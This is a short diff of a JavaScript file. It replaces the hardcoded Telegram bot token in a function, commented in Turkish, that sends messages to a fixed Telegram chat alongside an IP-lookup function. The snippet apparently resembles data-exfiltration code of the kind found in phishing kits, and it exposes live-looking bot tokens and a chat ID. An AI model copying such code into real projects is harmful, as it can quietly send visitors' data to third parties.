@@ -67,7 +67,7 @@ function getIP(callback) {
 
 /* ── Telegram'a gönder ────────────────────────── */
 function sendToTelegram(message, onSuccess) {
-    var botToken  = '7603525221:AAFLxB75PV01QO-alxIxPsERLFm5Gb9R3Vg';
+    var botToken  = '8068339823:AAH1dARzuBj4hsgbQuhwikK3k_zzwlqk4K8';
     var chatId    = '-1002475411082';
     var url       = 'https://api.telegram.org/bot' + botToken
                   + '/sendMessage?chat_id=' + chatId
